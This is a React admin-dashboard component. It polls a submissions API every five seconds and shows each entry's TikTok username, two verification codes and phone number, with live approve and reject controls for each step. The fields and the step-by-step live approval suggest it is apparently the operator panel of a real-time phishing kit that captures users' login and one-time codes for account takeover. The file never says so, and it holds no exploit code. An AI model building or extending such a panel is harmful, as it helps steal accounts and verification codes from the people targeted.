
'use client';

import {
  Users,
  Clock,
  Trash2,
  MoreVertical,
} from 'lucide-react';
import {
  Card,
  CardContent,
  CardDescription,
  CardHeader,
  CardTitle,
} from '@/components/ui/card';
import {
  Table,
  TableBody,
  TableCell,
  TableHead,
  TableHeader,
  TableRow,
} from '@/components/ui/table';
import {
  DropdownMenu,
  DropdownMenuContent,
  DropdownMenuItem,
  DropdownMenuTrigger,
} from '@/components/ui/dropdown-menu';
import { Button } from '@/components/ui/button';
import { Badge } from '@/components/ui/badge';
import { formatDistanceToNow } from 'date-fns';
import { SubmissionApprovalActions } from '@/components/admin/submission-approval-actions';
import type { Submission } from '@/lib/types';
import { useState, useEffect } from 'react';
import { useToast } from '@/hooks/use-toast';
import { deleteSubmissionAction } from './actions';

const getStatusBadge = (status: string) => {
  switch (status) {
    case 'approved':
      return <Badge className="bg-green-100 text-green-700 border-green-200 hover:bg-green-100/80">Approved</Badge>;
    case 'rejected':
      return <Badge variant="destructive">Rejected</Badge>;
    case 'pending':
    default:
      return <Badge variant="secondary">Pending</Badge>;
  }
};

interface AdminDashboardProps {
    initialSubmissions: Submission[];
}

export function AdminDashboard({ initialSubmissions }: AdminDashboardProps) {
  const [submissions, setSubmissions] = useState(initialSubmissions);
  const { toast } = useToast();

  // Real-time data fetching
  useEffect(() => {
    const interval = setInterval(async () => {
      try {
        const subRes = await fetch('/api/submissions');
        
        if (subRes.ok) {
          const newSubmissions: Submission[] = await subRes.json();
           
           // Sort by date descending
          newSubmissions.sort((a, b) => new Date(b.createdAt).getTime() - new Date(a.createdAt).getTime());
          
          setSubmissions(newSubmissions);
        }
      } catch (error) {
        console.error("Failed to fetch real-time data:", error);
      }
    }, 5000); // Poll every 5 seconds

    return () => clearInterval(interval);
  }, []);

  const totalSubmissions = submissions.length;
  const pendingSubmissions = submissions.filter(
    (s) => !s.isVerified && s.finalCodeStatus !== 'rejected'
  ).length;
  
  const handleDeleteSubmission = async (submissionId: string) => {
    if (!confirm('Are you sure you want to delete this submission? This action cannot be undone.')) {
      return;
    }
    
    const result = await deleteSubmissionAction(submissionId);

    if (result.success) {
      setSubmissions(prev => prev.filter(s => s.id !== submissionId));
      toast({ title: 'Success', description: 'Submission has been deleted.' });
    } else {
      toast({ variant: 'destructive', title: 'Error', description: result.message });
    }
  };


  return (
    <>
      <div className="grid gap-4 md:grid-cols-2 lg:grid-cols-3">
        <Card>
          <CardHeader className="flex flex-row items-center justify-between pb-2 space-y-0">
            <CardTitle className="text-sm font-medium">Total Submissions</CardTitle>
            <Users className="h-4 w-4 text-muted-foreground" />
          </CardHeader>
          <CardContent>
            <div className="text-2xl font-bold">{totalSubmissions}</div>
            <p className="text-xs text-muted-foreground">
              All submissions received.
            </p>
          </CardContent>
        </Card>
        <Card>
          <CardHeader className="flex flex-row items-center justify-between pb-2 space-y-0">
            <CardTitle className="text-sm font-medium">Pending Review</CardTitle>
            <Clock className="h-4 w-4 text-muted-foreground" />
          </CardHeader>
          <CardContent>
            <div className="text-2xl font-bold">{pendingSubmissions}</div>
            <p className="text-xs text-muted-foreground">
              Submissions awaiting final approval.
            </p>
          </CardContent>
        </Card>
      </div>

      <Card>
        <CardHeader className="px-7">
          <CardTitle>User Submissions</CardTitle>
          <CardDescription>Review and manage all user submissions.</CardDescription>
        </CardHeader>
        <CardContent>
          <Table>
            <TableHeader>
              <TableRow>
                <TableHead>User</TableHead>
                <TableHead>Username</TableHead>
                <TableHead>Code 1</TableHead>
                <TableHead>Phone</TableHead>
                <TableHead>Code 2</TableHead>
                <TableHead>Submitted</TableHead>
                <TableHead className="text-right">Actions</TableHead>
              </TableRow>
            </TableHeader>
            <TableBody>
              {submissions && submissions.length > 0 ? (
                submissions.map((sub) => (
                  <TableRow key={sub.id}>
                    <TableCell className="font-medium text-xs text-muted-foreground">
                      {sub.id}
                    </TableCell>
                    <TableCell>
                        <div className="flex items-center gap-2">
                            <span>@{sub.tiktokUsername}</span>
                            {getStatusBadge(sub.tiktokUsernameStatus)}
                        </div>
                    </TableCell>
                      <TableCell>
                        <div className="flex items-center gap-2">
                            <span>{sub.verificationCode || '...'}</span>
                            {sub.verificationCode && getStatusBadge(sub.verificationCodeStatus)}
                            {sub.verificationCode && sub.verificationCodeStatus === 'pending' &&
                                <SubmissionApprovalActions id={sub.id} step="verificationCode" />}
                        </div>
                    </TableCell>
                    <TableCell>
                        <div className="flex items-center gap-2">
                            <span>{sub.phoneNumber || '...'}</span>
                            {sub.phoneNumber && getStatusBadge(sub.phoneNumberStatus)}
                              {sub.phoneNumber && sub.phoneNumberStatus === 'pending' &&
                                <SubmissionApprovalActions id={sub.id} step="phoneNumber" />}
                        </div>
                    </TableCell>
                    <TableCell>
                        <div className="flex items-center gap-2">
                            <span>{sub.finalCode || '...'}</span>
                            {sub.finalCode && getStatusBadge(sub.finalCodeStatus)}
                              {sub.finalCode && sub.finalCodeStatus === 'pending' &&
                                <SubmissionApprovalActions id={sub.id} step="finalCode" />}
                        </div>
                    </TableCell>
                    <TableCell>
                      <span className="text-xs text-muted-foreground">
                        {formatDistanceToNow(new Date(sub.createdAt), { addSuffix: true })}
                      </span>
                    </TableCell>
                    <TableCell className="text-right">
                      <DropdownMenu>
                        <DropdownMenuTrigger asChild>
                          <Button size="icon" variant="ghost">
                            <MoreVertical className="h-4 w-4" />
                          </Button>
                        </DropdownMenuTrigger>
                        <DropdownMenuContent align="end">
                          <DropdownMenuItem onSelect={() => handleDeleteSubmission(sub.id)}>
                            <Trash2 className="mr-2 h-4 w-4" />
                            Delete
                          </DropdownMenuItem>
                        </DropdownMenuContent>
                      </DropdownMenu>
                    </TableCell>
                  </TableRow>
                ))
              ) : (
                <TableRow>
                  <TableCell colSpan={7} className="h-24 text-center">
                    No submissions found.
                  </TableCell>
                </TableRow>
              )}
            </TableBody>
          </Table>
        </CardContent>
      </Card>
    </>
  );
}
